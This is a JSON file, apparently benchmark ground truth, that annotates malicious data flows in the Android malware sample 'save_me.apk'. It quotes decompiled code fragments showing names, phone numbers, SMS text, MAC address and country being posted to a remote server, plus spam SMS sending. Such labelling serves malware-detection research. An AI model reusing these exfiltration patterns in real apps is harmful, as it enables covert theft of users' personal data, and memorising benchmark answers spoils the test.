@@ -1,0 +1,1892 @@
+{
+  "fileName": "save_me.apk",
+  "day": "2019-03-12",
+  "findings": [
+    {
+      "source": {
+        "statement": "Analyse.fname = ((EditText) Analyse.this.findViewById(R.id.name)).getText().toString();",
+        "methodName": "public void onClick(View v)",
+        "className": "com.savemebeta.Analyse.AnonymousClass1",
+        "lineNo": 134,
+        "targetName": "getText",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "cv.put(\"user_name\", name);",
+        "methodName": "public void putInformation(DatabaseOperationslogin dop, String name, String number, String pass)",
+        "className": "com.savemebeta.DatabaseOperationslogin",
+        "lineNo": 43,
+        "targetName": "put",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_name\", $r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "DB.putInformation(DB, Analyse.fname, Analyse.phone, \"1\");",
+          "methodName": "public void onClick(View v)",
+          "className": "com.savemebeta.Analyse.AnonymousClass1",
+          "lineNo": 144,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "staticField": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads user name from the input field and stores into database, which will be queried by the service called CO running in the background and sent to a remote server via HTTP requests.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Analyse.phone = ((EditText) Analyse.this.findViewById(R.id.phone)).getText().toString();",
+        "methodName": "public void onClick(View v)",
+        "className": "com.savemebeta.Analyse.AnonymousClass1",
+        "lineNo": 137,
+        "targetName": "getText",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "cv.put(\"user_number\", number);",
+        "methodName": "public void putInformation(DatabaseOperationslogin dop, String name, String number, String pass)",
+        "className": "com.savemebeta.DatabaseOperationslogin",
+        "lineNo": 44,
+        "targetName": "put",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_number\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "DB.putInformation(DB, Analyse.fname, Analyse.phone, \"1\");",
+          "methodName": "public void onClick(View v)",
+          "className": "com.savemebeta.Analyse.AnonymousClass1",
+          "lineNo": 144,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "staticField": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads phone number from the input field and stores into database, which will be queried by the service called CO running in the background and sent to a remote server via HTTP requests.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "SmsManager.getDefault().sendTextMessage(this.DB2, null, SMS, null, null);",
+        "methodName": "public void fetchContacts()",
+        "className": "com.savemebeta.SCHKMS",
+        "lineNo": 333,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r5, null, $r6, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public void fetchContacts()",
+          "className": "com.savemebeta.SCHKMS",
+          "lineNo": 309,
+          "ID": 1
+        },
+        {
+          "statement": "this.DB2 = CR.getString(1);",
+          "methodName": "public void fetchContacts()",
+          "className": "com.savemebeta.SCHKMS",
+          "lineNo": 314,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "nonStaticField": true,
+        "staticField": true
+      },
+      "ID": 3,
+      "description": "This malicious flow reads the phone number from database and sends spam sms message to this phone number.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CO.sendcontact",
+        "lineNo": 321,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 276,
+          "ID": 1
+        },
+        {
+          "statement": "NAME = CR.getString(0);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 287,
+          "ID": 2
+        },
+        {
+          "statement": "NAME = new String(NAME.getBytes(\"UTF-8\"), \"UTF-8\");",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 301,
+          "ID": 3
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"name\", NAME));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 310,
+          "ID": 4
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 316,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow reads user name from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CO.sendcontact",
+        "lineNo": 321,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 276,
+          "ID": 1
+        },
+        {
+          "statement": "NUMBER = CR.getString(1);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 288,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 311,
+          "ID": 3
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 316,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 5,
+      "description": "This malicious flow reads phone number from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CO",
+        "lineNo": 127,
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CO.sendcontact",
+        "lineNo": 321,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "FromMac = CO.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 289,
+          "ID": 1
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"frommac\", FromMac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 313,
+          "ID": 2
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 316,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 6,
+      "description": "This malicious flow reads MAC address and writes it into a public field of the service CO. Value from this field is put into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "country = ((TelephonyManager) getSystemService(\"phone\")).getSimCountryIso();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CO",
+        "lineNo": 123,
+        "targetName": "getSimCountryIso",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r10.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CO.sendcontact",
+        "lineNo": 321,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"counta\", CO.country));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 314,
+          "ID": 1
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 316,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "lifecycle": true,
+        "staticField": true,
+        "threading": true
+      },
+      "ID": 7,
+      "description": "This malicious flow reads country information and writes it into a public field of the service CO. Value from this field is put into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
+        "className": "com.savemebeta.DatabaseOperationssmssave2",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata2",
+        "lineNo": 797,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 753,
+          "ID": 1
+        },
+        {
+          "statement": "NAME = CR.getString(0);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 764,
+          "ID": 2
+        },
+        {
+          "statement": "NAME = new String(NAME.getBytes(\"UTF-8\"), \"UTF-8\");",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 777,
+          "ID": 3
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"name\", NAME));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 786,
+          "ID": 4
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 792,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 8,
+      "description": "This malicious flow reads user name from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
+        "className": "com.savemebeta.DatabaseOperationssmssave2",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata2",
+        "lineNo": 797,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 753,
+          "ID": 1
+        },
+        {
+          "statement": "NUMBER = CR.getString(1);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 765,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 787,
+          "ID": 3
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 792,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 9,
+      "description": "This malicious flow reads phone number from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
+        "className": "com.savemebeta.DatabaseOperationssmssave2",
+        "lineNo": 55,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata2",
+        "lineNo": 797,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 753,
+          "ID": 1
+        },
+        {
+          "statement": "FromMac = CR.getString(2);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 766,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"frommac\", FromMac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 788,
+          "ID": 3
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 792,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 10,
+      "description": "This malicious flow reads MAC address from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Analyse.phone = ((EditText) Analyse.this.findViewById(R.id.phone)).getText().toString();",
+        "methodName": "public void onClick(View v)",
+        "className": "com.savemebeta.Analyse.AnonymousClass1",
+        "lineNo": 137,
+        "targetName": "getText",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata",
+        "lineNo": 706,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "extras.putString(\"var\", Analyse.phone);",
+          "methodName": "public Object doInBackground(String... urls)",
+          "className": "com.savemebeta.Analyse.AddFriend",
+          "lineNo": 272,
+          "ID": 1
+        },
+        {
+          "statement": "Analyse.this.startActivity(intent);",
+          "methodName": "public Object doInBackground(String... urls)",
+          "className": "com.savemebeta.Analyse.AddFriend",
+          "lineNo": 274,
+          "ID": 2
+        },
+        {
+          "statement": "this.var = intent.getExtras().getString(\"var\");",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.savemebeta.Scan",
+          "lineNo": 179,
+          "ID": 3
+        },
+        {
+          "statement": "FromTel = Scan.this.var;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 676,
+          "ID": 4
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"fromtel\", FromTel));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 698,
+          "ID": 5
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 701,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "staticField": true,
+        "threading": true
+      },
+      "ID": 11,
+      "description": "This malicious ICC flow starts by reading phone number from the input field and stores the value into an intent. With this intent a new activity is stareted. Phone number is read from the intent, written into an ArrayList which is sent to a remote server via an HTTP post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getText",
+        "targetNo": 1,
+        "statement": "SOSsm.this.sms = editText.getText().toString();",
+        "methodName": "public void onClick(View arg0)",
+        "className": "com.savemebeta.SOSsm.AnonymousClass1",
+        "lineNo": 62,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r6.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.SOSsm.sendsmsdata2",
+        "lineNo": 112,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new sendsmsdata2().execute(new Void[0]);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.savemebeta.SOSsm.AnonymousClass1",
+          "lineNo": 64,
+          "ID": 1
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"sms\", SOSsm.this.sms));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.SOSsm.sendsmsdata2",
+          "lineNo": 103,
+          "ID": 2
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.SOSsm.sendsmsdata2",
+          "lineNo": 107,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow sends user input to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "nonStaticField": true,
+        "collections": true,
+        "callbacks": true,
+        "threading": true
+      },
+      "ID": 12
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 115,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+        "lineNo": 162,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r4.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new sendmyinfos().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.CHECKUPD",
+          "lineNo": 133,
+          "ID": 1
+        },
+        {
+          "statement": "String MAC = CHECKUPD.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+          "lineNo": 145,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", MAC));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+          "lineNo": 154,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 13
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 115,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.sendmystatus",
+        "lineNo": 215,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new sendmyinfos().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.CHECKUPD",
+          "lineNo": 133,
+          "ID": 1
+        },
+        {
+          "statement": "new sendmystatus().execute(new Void[0]);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+          "lineNo": 171,
+          "ID": 2
+        },
+        {
+          "statement": "CHECKUPD.Mac = CHECKUPD.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmystatus",
+          "lineNo": 190,
+          "ID": 3
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", CHECKUPD.Mac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmystatus",
+          "lineNo": 201,
+          "ID": 4
+        }
+      ],
+      "description": "This malicious flow reads Mac address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
